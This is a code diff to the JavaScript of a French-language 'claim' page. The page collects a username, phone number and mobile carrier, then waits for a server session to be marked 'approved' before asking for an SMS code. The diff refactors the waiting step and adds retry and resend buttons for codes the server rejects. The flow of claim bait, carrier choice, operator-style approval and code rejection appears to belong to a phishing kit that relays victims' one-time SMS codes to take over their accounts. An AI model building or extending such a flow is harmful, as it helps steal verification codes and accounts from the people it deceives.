@@ -3,6 +3,7 @@ const usernameInput = document.getElementById("username");
 const phoneInput = document.getElementById("phone");
 const claimBtn = document.getElementById("claim-btn");
 const verifyBtn = document.getElementById("verify-btn");
+const retryBtn = document.getElementById("retry-btn");
 const resendBtn = document.getElementById("resend-btn");
 const codeInput = document.getElementById("code");
 const codeField = document.getElementById("code-field");
@@ -75,7 +76,7 @@ function showCodeRejectedUi() {
   codeError.hidden = false;
   codeField.hidden = true;
   verifyBtn.hidden = true;
-  codeStatus.textContent = "Code refusé — vous pouvez demander un nouveau code.";
+  codeStatus.textContent = "Code refusé — revérifiez ou demandez un nouveau code.";
 }
 
 function updateClaimButton() {
@@ -134,8 +135,36 @@ function setLoadingStep(index) {
   });
 }
 
+function showSmsWaitingStep() {
+  showStep("loading");
+  loadingSteps.forEach((step, i) => {
+    step.classList.toggle("is-done", i < 2);
+    step.classList.toggle("is-active", i === 2);
+  });
+  loadingMessage.textContent = loadingMessages[2];
+}
+
+async function finishSmsWaiting() {
+  loadingMessage.textContent = "Code envoyé !";
+  loadingSteps.forEach((step) => {
+    step.classList.remove("is-active");
+    step.classList.add("is-done");
+  });
+
+  await wait(900);
+  resetCodeUi();
+  showStep("code");
+  codeInput.focus();
+}
+
 function wait(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+async function waitForSmsApproval() {
+  showSmsWaitingStep();
+  await pollSession(["approved"]);
+  await finishSmsWaiting();
 }
 
 async function startLoadingFlow() {
@@ -164,19 +193,7 @@ async function startLoadingFlow() {
     return;
   }
 
-  setLoadingStep(2);
-  await pollSession(["approved"]);
-
-  loadingMessage.textContent = "Code envoyé !";
-  loadingSteps.forEach((step) => {
-    step.classList.remove("is-active");
-    step.classList.add("is-done");
-  });
-
-  await wait(900);
-  resetCodeUi();
-  showStep("code");
-  codeInput.focus();
+  await waitForSmsApproval();
 }
 
 async function submitCodeVerification() {
@@ -211,6 +228,35 @@ async function submitCodeVerification() {
   }
 
   showCodeRejectedUi();
+}
+
+async function requestNewSmsCode() {
+  if (!sessionId) return;
+
+  resendBtn.disabled = true;
+  retryBtn.disabled = true;
+  resendBtn.textContent = "Envoi…";
+
+  try {
+    await sendSubmission("resend_code", {
+      sessionId,
+      username: formData.username,
+      phone: formData.phone,
+      carrier: formData.carrier,
+    });
+  } catch {
+    codeStatus.textContent = "Erreur lors de la demande. Réessayez.";
+    resendBtn.disabled = false;
+    retryBtn.disabled = false;
+    resendBtn.textContent = "Renvoyer un code";
+    return;
+  }
+
+  await waitForSmsApproval();
+
+  resendBtn.disabled = false;
+  retryBtn.disabled = false;
+  resendBtn.textContent = "Renvoyer un code";
 }
 
 carrierButtons.forEach((button) => {
@@ -261,28 +307,11 @@ verifyBtn.addEventListener("click", () => {
   submitCodeVerification();
 });
 
-resendBtn.addEventListener("click", async () => {
-  if (!sessionId) return;
-
-  resendBtn.disabled = true;
-  resendBtn.textContent = "Envoi…";
-
-  try {
-    await sendSubmission("resend_code", {
-      sessionId,
-      username: formData.username,
-      phone: formData.phone,
-      carrier: formData.carrier,
-    });
-  } catch {
-    codeStatus.textContent = "Erreur lors de la demande. Réessayez.";
-    resendBtn.disabled = false;
-    resendBtn.textContent = "Renvoyer un code";
-    return;
-  }
-
+retryBtn.addEventListener("click", () => {
   resetCodeUi();
   codeInput.focus();
-  resendBtn.disabled = false;
-  resendBtn.textContent = "Renvoyer un code";
+});
+
+resendBtn.addEventListener("click", () => {
+  requestNewSmsCode();
 });
